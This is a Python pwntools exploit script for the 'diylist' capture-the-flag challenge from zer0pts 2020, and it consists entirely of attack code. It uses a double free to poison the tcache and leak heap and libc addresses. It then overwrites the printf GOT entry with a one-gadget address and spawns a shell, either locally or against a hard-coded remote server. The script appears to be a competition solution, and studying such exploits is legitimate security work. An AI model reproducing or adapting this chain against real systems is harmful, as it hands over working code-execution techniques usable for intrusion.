from pwn import *
import sys

def add(typ, data):
	t.sendlineafter('> ', '1')
	t.sendlineafter('str=3): ', str(typ))
	t.sendlineafter('Data: ', str(data))

def get(idx, typ):
	t.sendlineafter('> ', '2')
	t.sendlineafter('Index: ', str(idx))
	t.sendlineafter('str=3): ', str(typ))
	t.recvuntil('Data: ')
	return t.recvline()[:-1]

def edit(idx, typ, data):
	t.sendlineafter('> ', '3')
	t.sendlineafter('Index: ', str(idx))
	t.sendlineafter('str=3): ', str(typ))
	t.sendlineafter('Data: ', str(data))

def delete(idx):
	t.sendlineafter('> ', '4')
	t.sendlineafter('Index: ', str(idx))

def exploit():
	t_long = 1
	t_double = 2
	t_str = 3

	add(3, "AAAABBBB")
	add(3, "AAAABBBB")
	add(3, "AAAABBBB") 
	add(3, "AAAABBBB") 

	# Fill tcache
	for _ in range(10):	
		add(3, "@"*0x90)
	for i in range(8):
		delete(3) 

	leak = int(get(3, t_long))
	log.info('heap leak: {}'.format(hex(leak)))

	# Create another item pointing to the same chunk by setting the 
	# integer val as the pointer
	edit(4, t_long, leak)

	# Free this chunk, it should go into unsorted bin and have fd and 
	# bk pointing to main_arena
	delete(3)

	# Leak main_arena pointer
	libc_leak = get(3, t_str)
	libc_leak = u64(libc_leak.ljust(8, '\0'))
	libc_base = libc_leak - 0x3ebca0
	log.info('libc leak: {}'.format(hex(libc_leak)))
	log.info('libc base: {}'.format(hex(libc_base)))

	# ===================================================
	# Now exploit the double free again but this time overwrite fd

	og = libc_base + 0x10a38c
	leak = int(get(1, t_long))
	log.info('second heap leak: {}'.format(hex(leak)))
	log.info('og: {}'.format(hex(og)))
	# Create another item pointing to this chunk
	edit(2, t_long, leak)
	# Double free the chunk
	delete(1)
	delete(1)

	# Overwrite fd to point to printf GOT, tcache doesn't need us to
	# fake anything
	add(3, p64(0x602050))
	add(3, 'XXXX')

	# Allocate chunk in GOT and overwrite contents with one gadget
	log.info('Spawning shell...')
	add(3, p64(og))

	t.interactive()


if __name__=='__main__':
	if len(sys.argv) > 1:
		t = remote('13.231.207.73', 9007)
	else:
		t = process('./chall', env={'LD_LIBRARY_PATH': '/home/pwn/ctf/zer0pts_20/diylist/'})
		pause()

	exploit()
